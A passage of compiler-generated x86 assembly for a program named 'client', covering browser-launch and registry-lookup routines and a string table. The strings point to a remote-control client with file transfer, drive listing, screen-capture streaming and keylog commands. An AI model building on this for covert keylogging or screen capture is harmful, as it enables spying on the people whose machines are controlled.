	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.468:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.468			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,164			;;; i114a
;
funcBody67.client:
;
; [2622] IFZ url$ THEN RETURN
	mov	eax,[ebp+8]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.465			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.010C.client			;;; i192
A.465:
	xor	eax,eax			;;; i862
	jmp	end.func67.client			;;; i258
else.010C.client:
end.if.010C.client:
;
; [2624] key$ = NULL$ (512)
#ifdef LaunchBrowser.key$
#undef LaunchBrowser.key$
#endif
#define LaunchBrowser.key$ ebp-40	; exposes local variable 'key$'
;
	sub	esp,64			;;; i487
	mov	d[esp],512
	call	%_null.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2626] ' First try ShellExecute()
;
; [2627] result = ShellExecuteA (NULL, &"open", &url$, NULL, NULL, showcmd)
#ifdef LaunchBrowser.result
#undef LaunchBrowser.result
#endif
#define LaunchBrowser.result ebp-44	; exposes local variable 'result'
;
;
; [0] EXTERNAL FUNCTION ShellExecuteA (hwnd, lpOperationAddr, lpFileAddr, lpParametersAddr, lpDirectoryAddr, nShowCmd)
#ifdef LaunchBrowser.NULL
#undef LaunchBrowser.NULL
#endif
#define LaunchBrowser.NULL ebp-48	; exposes local variable 'NULL'
;
	mov	eax,addr @_string.05F6.client			;;; i642
; .xstk67.0000 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
	mov	eax,d[ebp+8]			;;; i642
; .xstk67.0001 = ebp-64	; internal variable
	mov	d[ebp-64],eax			;;; i670
#ifdef LaunchBrowser.showcmd
#undef LaunchBrowser.showcmd
#endif
#define LaunchBrowser.showcmd ebp-68	; exposes local variable 'showcmd'
;
	push	[ebp-68]			;;; i674a
	push	[ebp-48]			;;; i674a
	push	[ebp-48]			;;; i674a
	push	[ebp-64]			;;; i674a
	push	[ebp-56]			;;; i674a
	push	[ebp-48]			;;; i674a
	call	_ShellExecuteA@24			;;; i619
	mov	d[ebp-44],eax			;;; i670
;
; [2629] ' If it failed, get the .htm regkey and lookup the program
;
; [2630] IF (result <= $$HINSTANCE_ERROR) THEN
	mov	eax,d[ebp-44]			;;; i665
	cmp	eax,32			;;; i684a
	jg	>> else.010D.client			;;; i219
;
; [2631] IF (GetRegKey ($$HKEY_CLASSES_ROOT, ".htm", @key$) == $$ERROR_SUCCESS) THEN
	mov	eax,addr @_string.05FA.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-56],eax			;;; i670
	push	[ebp-40]			;;; i674a
	push	[ebp-56]			;;; i674a
	push	-2147483648			;;; i656a
	call	func68.client			;;; i619
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	mov	ecx,d[esp+8]			;;; i877a
	mov	[ebp-40],ecx			;;; i670
	add	esp,12			;;; i633
	cmp	eax,0			;;; i684a
	jne	>> else.010E.client			;;; i219
;
; [2632] key$ = key$ + "\\shell\\open\\command"
	mov	eax,[ebp-40]			;;; i665
	mov	ebx,addr @_string.05FC.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2633] IF (GetRegKey ($$HKEY_CLASSES_ROOT, key$, @path$) == $$ERROR_SUCCESS) THEN
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	mov	d[ebp-56],eax			;;; i670
#ifdef LaunchBrowser.path$
#undef LaunchBrowser.path$
#endif
#define LaunchBrowser.path$ ebp-72	; exposes local variable 'path$'
;
	push	[ebp-72]			;;; i674a
	push	[ebp-56]			;;; i674a
	push	-2147483648			;;; i656a
	call	func68.client			;;; i619
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	mov	ecx,d[esp+8]			;;; i877a
	mov	[ebp-72],ecx			;;; i670
	add	esp,12			;;; i633
	cmp	eax,0			;;; i684a
	jne	>> else.010F.client			;;; i219
;
; [2634] pos = INSTR (path$, "\"%1\"")' Look for "%1"
#ifdef LaunchBrowser.pos
#undef LaunchBrowser.pos
#endif
#define LaunchBrowser.pos ebp-76	; exposes local variable 'pos'
;
	sub	esp,64			;;; i487
	mov	eax,[ebp-72]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,addr @_string.05FF.client			;;; i663
	mov	d[esp+4],eax			;;; i887
	mov	d[esp+8],0			;;; i571
	call	%_instr.vv			;;; i572
	add	esp,64			;;; i600
	mov	d[ebp-76],eax			;;; i670
;
; [2635] IFZ pos THEN' No quotes found
	mov	eax,d[ebp-76]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0110.client			;;; i195
;
; [2636] pos = INSTR (path$, "%1")' Check for %1, without quotes
	sub	esp,64			;;; i487
	mov	eax,[ebp-72]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,addr @_string.0600.client			;;; i663
	mov	d[esp+4],eax			;;; i887
	mov	d[esp+8],0			;;; i571
	call	%_instr.vv			;;; i572
	add	esp,64			;;; i600
	mov	d[ebp-76],eax			;;; i670
;
; [2637] END IF
else.0110.client:
end.if.0110.client:
;
; [2638] IF pos THEN path$ = TRIM$ (LEFT$ (path$, pos-1))
	mov	eax,d[ebp-76]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0111.client			;;; i221
	sub	esp,64			;;; i487
	sub	esp,64			;;; i487
	mov	eax,[ebp-72]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-76]			;;; i665
	sub	eax,1			;;; i791
	mov	d[esp+4],eax			;;; i887
	call	%_left.d.v			;;; i578
	add	esp,64			;;; i600
	mov	d[esp],eax			;;; i887
	call	%_trim.d.s			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp-72]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
else.0111.client:
end.if.0111.client:
;
; [2639] path$ = path$ + " " + url$
	mov	eax,[ebp-72]			;;; i665
	mov	ebx,addr @_string.0145.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp+8]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-72]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2640] result = WinExec (&path$, showcmd)
;
; [0] EXTERNAL FUNCTION WinExec (lpCmdLine, nCmdShow)
	mov	eax,d[ebp-72]			;;; i642
	mov	d[ebp-56],eax			;;; i670
	push	[ebp-68]			;;; i674a
	push	[ebp-56]			;;; i674a
	call	_WinExec@8			;;; i619
	mov	d[ebp-44],eax			;;; i670
;
; [2641] END IF
else.010F.client:
end.if.010F.client:
;
; [2642] END IF
else.010E.client:
end.if.010E.client:
;
; [2643] END IF
else.010D.client:
end.if.010D.client:
;
; [2644] RETURN result
	mov	eax,d[ebp-44]			;;; i665
	jmp	end.func67.client			;;; i258
;
; [2646] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.LaunchBrowser.client:  ;;; Function end label for Assembly Programmers.
end.func67.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func67.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func67.client:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-72]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  LaunchBrowser ()  *****
;  *****
;
; [2648] FUNCTION  GetRegKey (key, subkey$, @retdata$)
.code
;
#ifdef GetRegKey.key
#undef GetRegKey.key
#endif
#define GetRegKey.key ebp+8	; exposes function argument 'key'
;
;
#ifdef GetRegKey.subkey$
#undef GetRegKey.subkey$
#endif
#define GetRegKey.subkey$ ebp+12	; exposes function argument 'subkey$'
;
;
#ifdef GetRegKey.retdata$
#undef GetRegKey.retdata$
#endif
#define GetRegKey.retdata$ ebp+16	; exposes function argument 'retdata$'
;
align 16
_GetRegKey.client@12:
;  *****
;  *****  FUNCTION  GetRegKey ()  *****
;  *****
func68.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.471:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.471			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,180			;;; i114a
;
funcBody68.client:
;
; [2650] retval = RegOpenKeyExA (key, &subkey$, 0, $$KEY_QUERY_VALUE, &hkey)
#ifdef GetRegKey.retval
#undef GetRegKey.retval
#endif
#define GetRegKey.retval ebp-40	; exposes local variable 'retval'
;
;
; [0] EXTERNAL FUNCTION RegOpenKeyExA (hKey, lpSubKey, ulOptions, samDesired, phkResult)
	mov	eax,d[ebp+12]			;;; i642
; .xstk68.0000 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
#ifdef GetRegKey.hkey
#undef GetRegKey.hkey
#endif
#define GetRegKey.hkey ebp-52	; exposes local variable 'hkey'
;
	lea	eax,[ebp-52]			;;; i642
	push	eax			;;; i667a
	push	1			;;; i656a
	push	0			;;; i656a
	push	[ebp-48]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	_RegOpenKeyExA@20			;;; i619
	mov	d[ebp-40],eax			;;; i670
;
; [2652] IF (retval == $$ERROR_SUCCESS) THEN
	mov	eax,d[ebp-40]			;;; i665
	cmp	eax,0			;;; i684a
	jne	>> else.0112.client			;;; i219
;
; [2653] datasize = $$MAX_PATH
#ifdef GetRegKey.datasize
#undef GetRegKey.datasize
#endif
#define GetRegKey.datasize ebp-56	; exposes local variable 'datasize'
;
	mov	eax,260			;;; i659
	mov	d[ebp-56],eax			;;; i670
;
; [2654] retdata$ = NULL$ ($$MAX_PATH)
	sub	esp,64			;;; i487
	mov	d[esp],260
	call	%_null.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp+16]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2655] RegQueryValueA (hkey, NULL, &retdata$, &datasize)
;
; [0] EXTERNAL FUNCTION RegQueryValueA (hKey, lpSubKey, lpValue, lpcbValue)
#ifdef GetRegKey.NULL
#undef GetRegKey.NULL
#endif
#define GetRegKey.NULL ebp-60	; exposes local variable 'NULL'
;
	mov	eax,d[ebp+16]			;;; i642
	mov	d[ebp-48],eax			;;; i670
	lea	eax,[ebp-56]			;;; i642
	push	eax			;;; i667a
	push	[ebp-48]			;;; i674a
	push	[ebp-60]			;;; i674a
	push	[ebp-52]			;;; i674a
	call	_RegQueryValueA@16			;;; i619
;
; [2656] retdata$ = TRIM$ (retdata$)
	sub	esp,64			;;; i487
	mov	eax,[ebp+16]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_trim.d.v			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp+16]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2657] RegCloseKey (hkey)
;
; [0] EXTERNAL FUNCTION RegCloseKey (hKey)
	push	[ebp-52]			;;; i674a
	call	_RegCloseKey@4			;;; i619
;
; [2658] END IF
else.0112.client:
end.if.0112.client:
;
; [2660] RETURN retval
	mov	eax,d[ebp-40]			;;; i665
	jmp	end.func68.client			;;; i258
;
; [2662] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetRegKey.client:  ;;; Function end label for Assembly Programmers.
end.func68.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  GetRegKey ()  *****
;  *****
;
; [2664] END PROGRAM
;<peep
end_program.client:
	push	ebp			;;; i128
	mov	ebp,esp			;;; i129
	sub	esp,128			;;; i130
	mov	esi,[%5%lastcmd.client]			;;; i663a
	call	%____free			;;; i423
	mov	esi,[%URLBuffer.client]			;;; i663a
	call	%____free			;;; i423
	mov	esi,d[%%%TabChildCon.client]			;;; i663a
	call	%_FreeArray			;;; i424
	mov	esi,[%5%msg$.client]			;;; i663a
	call	%____free			;;; i423
	mov	esi,[%className$.client]			;;; i663a
	call	%____free			;;; i423
	mov	esi,[%10%text.client]			;;; i663a
	call	%____free			;;; i423
	mov	esi,[%#server$.client]			;;; i663a
	call	%____free			;;; i423
	mov	esi,d[%%1B%%total.client]			;;; i663a
	call	%_FreeArray			;;; i424
	mov	esi,d[%%%sprofile.client]			;;; i663a
	call	%_FreeArray			;;; i424
	mov	esi,[%36%cmd$.client]			;;; i663a
	call	%____free			;;; i423
	mov	esi,[%39%strgd.client]			;;; i663a
	call	%____free			;;; i423
	mov	esi,d[%%%hwndPrev.client]			;;; i663a
	call	%_FreeArray			;;; i424
	mov	esi,[%39%strgu.client]			;;; i663a
	call	%____free			;;; i423
	mov	esi,[%sessionlog$.client]			;;; i663a
	call	%____free			;;; i423
	mov	esi,d[%%%dtree.client]			;;; i663a
	call	%_FreeArray			;;; i424
	call	_XxxTerminate@0
	mov	esp,ebp			;;; i132
	pop	ebp			;;; i133
	ret				;;; i134
;
InitSharedComposites.client:
	push	ebp			;;; i135
	mov	ebp,esp			;;; i136
	sub	esp,128			;;; i137
	mov	esi,224			;;; i138
	call	%____calloc			;;; i139a
	mov	eax,esi			;;; i139b
	mov	d[%.composites.client],eax			;;; i668
	lea	eax,[esi]			;;; i140
	lea	ebx,[esi+40]			;;; i140a
	lea	ecx,[esi+48]			;;; i140b
	lea	edx,[esi+64]			;;; i140c
	lea	edi,[esi+96]			;;; i140d
	mov	d[%51%tvi.client],eax			;;; i668
	mov	d[%5%pt.client],ebx			;;; i668
	mov	d[%5%rc.client],ecx			;;; i668
	mov	d[%5%en.client],edx			;;; i668
	mov	d[%5%txtr.client],edi			;;; i668
	lea	eax,[esi+108]			;;; i140
	lea	ebx,[esi+136]			;;; i140a
	lea	ecx,[esi+184]			;;; i140b
	mov	d[%C%msg.client],eax			;;; i668
	mov	d[%22%tvis.client],ebx			;;; i668
	mov	d[%22%tvi.client],ecx			;;; i668
	mov	esp,ebp			;;; i141
	pop	ebp			;;; i142
	ret				;;; i143
;
.code
; ########################
; #####  WinMain ()  #####
; ########################
align 8
_main:												; C entry label
_WinMain:											; Windows entry label
_WinMain@16:									; Windows entry label
	push ebp
	mov ebp,esp
	push addr %_StartApplication
	call _Xit@4
	call _XxxTerminate@0
	mov esp,ebp
	pop ebp
	ret
;
;;;  *****  DEFINE '.bss' SECTION LIMITS  *****
;
align 8
data section 'client$aaaaa'
%_begin_external_data_client dd ?
;
align 8
data section 'client$zzzzz'
%_end_external_data_client dd ?
;
;
;;;  *****  DEFINE LITERAL STRINGS  *****
.const
align 8
;
dd 24, 0, 6, 0x80130001
@_string.0029.client:
db	"client"
db	2 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.002A.client:
db	"0.7"
db	5 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.002B.client:
db	"xst"
db	5 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.002C.client:
db	"gdi32"
db	3 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.002D.client:
db	"wsock32"
db	1 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.002E.client:
db	"kernel32"
db	8 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.002F.client:
db	"msvcrt"
db	2 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0030.client:
db	"user32"
db	2 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.0031.client:
db	"shell32"
db	1 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.0032.client:
db	"comctl32"
db	8 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.0033.client:
db	"comdlg32"
db	8 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.0034.client:
db	"advapi32"
db	8 dup 0
;
dd 32, 0, 12, 0x80130001
@_string.0035.client:
db	"p2pfiled.dec"
db	4 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.0036.client:
db	"net.dec"
db	1 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0037.client:
db	"fs.obj"
db	2 dup 0
;
dd 40, 0, 20, 0x80130001
@_string.00E8.client:
db	"failed to initialize"
db	4 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.0100.client:
db	"- "
db	6 dup 0
;
dd 48, 0, 25, 0x80130001
@_string.0105.client:
db	0x0D,0x0A,"--- event log start ---"
db	7 dup 0
;
dd 40, 0, 23, 0x80130001
@_string.0106.client:
db	0x0D,0x0A,"--- event log end ---"
db	1 dup 0
;
dd 48, 0, 31, 0x80130001
@_string.0109.client:
db	" *** unable to save event log: "
db	1 dup 0
;
dd 48, 0, 27, 0x80130001
@_string.010E.client:
db	0x0D,0x0A,"--- session log start ---"
db	5 dup 0
;
dd 48, 0, 25, 0x80130001
@_string.010F.client:
db	0x0D,0x0A,"--- session log end ---"
db	7 dup 0
;
dd 56, 0, 33, 0x80130001
@_string.0111.client:
db	" *** unable to save session log: "
db	7 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.011C.client:
db	"server"
db	2 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.011D.client:
db	"connect"
db	1 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.011E.client:
db	"part"
db	4 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.011F.client:
db	"disconnect"
db	6 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.0120.client:
db	"alias"
db	3 dup 0
;
dd 32, 0, 12, 0x80130001
@_string.0121.client:
db	"192.168.1.1 "
db	4 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.0123.client:
db	"quit"
db	4 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0125.client:
db	"rename"
db	2 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0127.client:
db	"newdir"
db	2 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.0128.client:
db	"tree"
db	4 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0129.client:
db	"upload"
db	2 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.012C.client:
db	"download"
db	8 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.012D.client:
db	"clr"
db	5 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.012E.client:
db	"cls"
db	5 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.0130.client:
db	"getslog"
db	1 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.0131.client:
db	"getelog"
db	1 dup 0
;
dd 48, 0, 27, 0x80130001
@_string.0132.client:
db	0x0D,0x0A,"--- event log start ---",0x0D,0x0A
db	5 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0133.client:
db	"reauth"
db	2 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.0134.client:
db	"AUTH "
db	3 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.0136.client:
db	"stron"
db	3 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.013B.client:
db	"stroff"
db	2 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.013D.client:
db	"strp"
db	4 dup 0
;
dd 40, 0, 23, 0x80130001
@_string.013E.client:
db	"*** stream port set to "
db	1 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.013F.client:
db	"strq"
db	4 dup 0
;
dd 48, 0, 26, 0x80130001
@_string.0141.client:
db	"*** stream quality set to "
db	6 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.0142.client:
db	"strt"
db	4 dup 0
;
dd 48, 0, 24, 0x80130001
@_string.0144.client:
db	"*** stream delay set to "
db	8 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.0145.client:
db	" "
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.0147.client:
db	":"
db	7 dup 0
;
dd 40, 0, 16, 0x80130001
@_string.0148.client:
db	"* invalid path: "
db	8 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.0149.client:
db	0x5C
db	7 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.014B.client:
db	"-1 "
db	5 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.014D.client:
db	"treeb "
db	2 dup 0
;
dd 40, 0, 17, 0x80130001
@_string.0161.client:
db	"* uploading file "
db	7 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.0163.client:
db	"listen "
db	1 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.0164.client:
db	","
db	7 dup 0
;
dd 40, 0, 20, 0x80130001
@_string.0168.client:
db	"* upload completed: "
db	4 dup 0
;
dd 40, 0, 17, 0x80130001
@_string.0169.client:
db	"* upload failed: "
db	7 dup 0
;
dd 40, 0, 23, 0x80130001
@_string.0170.client:
db	"* download file timeout"
db	1 dup 0
;
dd 40, 0, 19, 0x80130001
@_string.0174.client:
db	"* downloading file "
db	5 dup 0
;
dd 40, 0, 22, 0x80130001
@_string.0178.client:
db	"* download completed: "
db	2 dup 0
;
dd 40, 0, 19, 0x80130001
@_string.0179.client:
db	"* download failed: "
db	5 dup 0
;
dd 40, 0, 19, 0x80130001
@_string.0196.client:
db	"* initiating stream"
db	5 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.0198.client:
db	"none"
db	4 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.019F.client:
db	"capscr "
db	1 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.01A3.client:
db	"tmp"
db	5 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.01A4.client:
db	".jpg"
db	4 dup 0
;
dd 40, 0, 19, 0x80130001
@_string.01A9.client:
db	"* streaming stopped"
db	5 dup 0
;
dd 48, 0, 24, 0x80130001
@_string.01AE.client:
db	"*** disconnect first ***"
db	8 dup 0
;
dd 40, 0, 18, 0x80130001
@_string.01B3.client:
db	"*** connecting to "
db	6 dup 0
;
dd 40, 0, 17, 0x80130001
@_string.01B7.client:
db	"*** connected to "
db	7 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.01B8.client:
db	" on port "
db	7 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.01BA.client:
db	"strevent"
db	8 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.01BB.client:
db	"off"
db	5 dup 0
;
dd 40, 0, 23, 0x80130001
@_string.01C0.client:
db	"*** disconnecting from "
db	1 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.01C1.client:
db	"*** "
db	4 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.01C2.client:
db	" disconnected"
db	3 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.01CE.client:
db	0x0D,0x0A
db	6 dup 0
;
dd 32, 0, 15, 0x80130001
@_string.01D9.client:
db	"* not connected"
db	1 dup 0
;
dd 32, 0, 14, 0x80130001
@_string.01DE.client:
db	"* send error: "
db	2 dup 0
;
dd 32, 0, 14, 0x80130001
@_string.01F4.client:
db	"* bind error: "
db	2 dup 0
;
dd 40, 0, 16, 0x80130001
@_string.01F6.client:
db	"* listen error: "
db	8 dup 0
;
dd 40, 0, 23, 0x80130001
@_string.01F9.client:
db	"* create socket error: "
db	1 dup 0
;
dd 40, 0, 17, 0x80130001
@_string.0202.client:
db	"* connect error: "
db	7 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.0223.client:
db	"CMSG"
db	4 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.0224.client:
db	"DIR"
db	5 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.0225.client:
db	"REFRESH"
db	1 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.0226.client:
db	"KEY"
db	5 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.0227.client:
db	"FINFO"
db	3 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0228.client:
db	"KEYLOG"
db	2 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.0229.client:
db	"EVENTFILE"
db	7 dup 0
;
dd 32, 0, 12, 0x80130001
@_string.022A.client:
db	"EVENTLOGPART"
db	4 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.022B.client:
db	"DRIVES"
db	2 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.022C.client:
db	"DISCONNECT"
db	6 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.022D.client:
db	"PING"
db	4 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.022E.client:
db	"PONG "
db	3 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.022F.client:
db	"AUTHFAIL"
db	8 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0231.client:
db	"AUTHOK"
db	2 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.0233.client:
db	"::"
db	6 dup 0
;
dd 40, 0, 18, 0x80130001
@_string.0237.client:
db	0x0D,0x0A,"--- properties: "
db	6 dup 0
;
dd 32, 0, 12, 0x80130001
@_string.0238.client:
db	":attributes",0x09
db	4 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.0239.client:
db	":size",0x09,0x09
db	1 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.023A.client:
db	":folders",0x09,0x09
db	6 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.023B.client:
db	":files",0x09,0x09
db	8 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.023E.client:
db	":created",0x09,0x09
db	6 dup 0
;
dd 32, 0, 11, 0x80130001
@_string.023F.client:
db	":modified",0x09,0x09
db	5 dup 0
;
dd 40, 0, 18, 0x80130001
@_string.0240.client:
db	"--- properties end"
db	6 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.0244.client:
db	"bytes"
db	3 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.0247.client:
db	"kb"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.0248.client:
db	"mb"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.0249.client:
db	"gb"
db	6 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.024D.client:
db	"Read Only"
db	7 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.024F.client:
db	"Hidden"
db	2 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0251.client:
db	"System"
db	2 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.0253.client:
db	"Directory"
db	7 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.0255.client:
db	"Archive"
db	1 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0257.client:
db	"Normal"
db	2 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.0259.client:
db	"Temporary"
db	7 dup 0
;
dd 32, 0, 12, 0x80130001
@_string.025B.client:
db	"Atomic Write"
db	4 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.025D.client:
db	"XAction Write"
db	3 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.025F.client:
db	"Compressed"
db	6 dup 0
;
dd 32, 0, 11, 0x80130001
@_string.0260.client:
db	"Sparse File"
db	5 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.0261.client:
db	"Reparse Point"
db	3 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.0262.client:
db	"Encrypted"
db	7 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.0263.client:
db	"Offline"
db	1 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0264.client:
db	"Device"
db	2 dup 0
;
dd 40, 0, 19, 0x80130001
@_string.0265.client:
db	"Not Content Indexed"
db	5 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.027B.client:
db	"0"
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.027E.client:
db	"/"
db	7 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.0285.client:
db	"pm"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.0286.client:
db	"am"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.0288.client:
db	", "
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
